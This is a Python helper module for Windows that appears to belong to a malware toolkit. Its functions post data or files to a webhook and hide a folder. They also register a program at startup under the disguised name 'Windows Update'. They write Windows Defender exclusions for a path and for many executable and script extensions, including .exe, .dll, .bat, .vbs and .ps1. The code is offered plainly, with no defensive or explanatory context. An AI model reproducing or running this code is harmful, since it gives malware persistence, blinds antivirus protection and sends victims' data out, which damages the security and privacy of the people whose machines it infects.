import os
import ctypes
import sys
import requests
import tempfile


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


# TODO potentially send embeds instead of code blocks cuz its cooler
def send_webhook(url, content=None, file=None):
    if not url:
        print("ERROR: ATTEMPTED TO SEND WEBHOOK WITHOUT URL")
        return
    if file:
        requests.post(url, files=file)
    else:
        requests.post(url, json={"content": content})


def is_exe():
    return getattr(sys, "frozen", False)


def get_logs_path(software_dir_name):
    return os.path.join(tempfile.gettempdir(), software_dir_name)


def display_error_message(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)


def hide_dir(path):
    ctypes.windll.kernel32.SetFileAttributesW(path, 2)


# NOT TESTED 
def add_to_startup(path):
    import winreg
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as reg:
        winreg.SetValueEx(reg, "Windows Update", 0, winreg.REG_SZ, path)

# NOT TESTED     
def add_to_windows_defender_exclusions(path):
    import winreg
    key = winreg.HKEY_LOCAL_MACHINE
    key_value = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as reg:
        winreg.SetValueEx(reg, path, 0, winreg.REG_SZ, path)
    key_value = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions"
    with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as reg:
        winreg.SetValueEx(reg, ".exe", 0, winreg.REG_SZ, ".exe")
        winreg.SetValueEx(reg, ".dll", 0, winreg.REG_SZ, ".dll")
        winreg.SetValueEx(reg, ".dat", 0, winreg.REG_SZ, ".dat")
        winreg.SetValueEx(reg, ".log", 0, winreg.REG_SZ, ".log")
        winreg.SetValueEx(reg, ".tmp", 0, winreg.REG_SZ, ".tmp")
        winreg.SetValueEx(reg, ".bat", 0, winreg.REG_SZ, ".bat")
        winreg.SetValueEx(reg, ".cmd", 0, winreg.REG_SZ, ".cmd")
        winreg.SetValueEx(reg, ".vbs", 0, winreg.REG_SZ, ".vbs")
        winreg.SetValueEx(reg, ".vbe", 0, winreg.REG_SZ, ".vbe")
        winreg.SetValueEx(reg, ".js", 0, winreg.REG_SZ, ".js")
        winreg.SetValueEx(reg, ".jse", 0, winreg.REG_SZ, ".jse")
        winreg.SetValueEx(reg, ".wsf", 0, winreg.REG_SZ, ".wsf")
        winreg.SetValueEx(reg, ".wsh", 0, winreg.REG_SZ, ".wsh")
        winreg.SetValueEx(reg, ".ps1", 0, winreg.REG_SZ, ".ps1")
        winreg.SetValueEx(reg, ".ps1xml", 0, winreg.REG_SZ, ".ps1xml")
        winreg.SetValueEx(reg, ".ps2", 0, winreg.REG_SZ, ".ps2")
        winreg.SetValueEx(reg, ".ps2xml", 0, winreg.REG_SZ, ".ps2xml")
        winreg.SetValueEx(reg, ".psc1", 0, winreg.REG_SZ, ".psc1")